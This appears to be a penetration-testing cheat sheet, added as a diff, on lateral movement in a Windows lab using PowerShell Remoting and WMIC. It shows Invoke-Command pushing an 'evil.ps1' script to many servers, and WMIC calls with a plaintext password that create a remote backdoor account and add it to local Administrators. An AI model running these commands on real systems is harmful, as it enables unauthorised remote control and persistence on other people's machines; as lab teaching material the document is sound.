@@ -1,1 +1,140 @@
 
+========================================================================================================================
+Lateral movement with native commands (WMIC, PowerShell Remoting) 
+========================================================================================================================
+
+Requirement: 
+> You need valid admin credentials on the remote Windows server or worksation
+
+
+========================================================================================================================
+Example 1 - Powershell Remoting
+========================================================================================================================
+
+1. Interactive PowerShell remote console using kerberos authentication (current session)
+--------------------------------------------------------------------------------------------
+
+PS C:\Users\pentester> hostname
+Laptop1
+
+PS C:\Users\pentester> whoami
+security-lab\pentester
+
+PS C:\Users\pentester> Enter-PSSession -Computername TEMP-DC.Security-Test-Lab.Local
+
+[TEMP-DC.Security-Test-Lab.Local]: PS C:\Users\pentester\Documents> hostname
+TEMP-DC
+
+[TEMP-DC.Security-Test-Lab.Local]: PS C:\Users\pentester\Documents> whoami
+security-lab\pentester
+
+[TEMP-DC.Security-Test-Lab.Local]: PS C:\Users\pentester\Documents> exit
+
+
+2. Interactive PowerShell remote console using credentials
+----------------------------------------------------------
+
+PS C:\Users\pentester> hostname
+Laptop1
+
+PS C:\Users\pentester> whoami
+security-lab\pentester
+
+PS C:\Users\pentester> Enter-PSSession -Computername TEMP-DC.Security-Test-Lab.Local -Credential security-lab\auditor
+
+[TEMP-DC.Security-Test-Lab.Local]: PS C:\Users\auditor\Documents> hostname
+TEMP-DC
+
+PS C:\Users\pentester> whoami
+security-lab\auditor
+
+[TEMP-DC.Security-Test-Lab.Local]: PS C:\Users\auditor\Documents> dir
+Volume in drive C has no label.
+Volume Serial Number is C022-C9A0
+Directory of C:\
+<SNIP>
+
+[TEMP-DC.Security-Test-Lab.Local]: PS C:\Users\auditor\Documents> exit
+
+
+3. Non-Interactive PowerShell remote OS command execution
+---------------------------------------------------------
+
+PS C:\AD\jfc-tools\x64> Invoke-Command -ScriptBlock{hostname;whoami} -computername TEMP-DC -Credential security-lab\auditor
+TEMP-DC
+security-lab\auditor
+
+PS C:\AD\jfc-tools\x64> Invoke-Command -ScriptBlock{hostname;whoami} -computername TEMP-DC
+TEMP-DC
+security-lab\pentester
+
+Note: 'Invoke-command' can also be used to execute a script or a command on multiple Windows servers
+------
+PS C:\AD\jfc-tools\x64> Invoke-command -Filepath C:\AD\Tools\evil.ps1 -ComputerName (get-content c:\path\list-servers.txt) -Credential security-lab\pentester
+or
+PS C:\AD\jfc-tools\x64> Invoke-command -Scriptblock {qwinsta} -ComputerName (get-content c:\path\list-servers.txt) -Credential security-lab\pentester
+
+
+========================================================================================================================
+Example 2 -  WMIC native commands
+========================================================================================================================
+
+Wmic /node:COMPUTER/user:DOMAIN\USER /password:PASSWORD process call create “COMMAND“
+
+
+C:\> wmic /node:"192.168.13.215" /user:".\administrator" /password:"Test1******" /privileges:ENABLE process call create "cmd.exe /c (echo net user auditor SuP@P@ssW0rd /add > C:\users\administrator\test.bat)"
+Executing (Win32_Process)->Create()
+Method execution successful.
+Out Parameters:
+instance of __PARAMETERS
+{
+        ProcessId = 340;
+        ReturnValue = 0;
+};
+
+
+C:\> wmic /node:"192.168.13.215" /user:".\administrator" /password:"Test1******!" /privileges:ENABLE process call create "cmd.exe /c (echo net localgroup Administrators auditor /add >> C:\users\administrator\test.bat)"
+Executing (Win32_Process)->Create()
+Method execution successful.
+Out Parameters:
+instance of __PARAMETERS
+{
+        ProcessId = 2412;
+        ReturnValue = 0;
+};
+
+
+C:\> wmic /node:"192.168.13.215" /user:".\administrator" /password:"Test1******!" /privileges:ENABLE process call create "cmd.exe /c (C:\users\administrator\test.bat)"
+Executing (Win32_Process)->Create()
+Method execution successful.
+Out Parameters:
+instance of __PARAMETERS
+{
+        ProcessId = 732;
+        ReturnValue = 0;
+};
+
+
+=> On the remote Windows server '192.168.13.215', the 'auditor' account has been created and added to the local admin group:
+
+C:\users\administrators> net user
+
+User accounts for \\Test-server
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount	     Guest
+auditor
+
+The command completed successfully.
+
+
+C:\users\administrators> net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+-------------------------------------------------------------------------------
+Administrator
+auditor
+The command completed successfully.
+
+
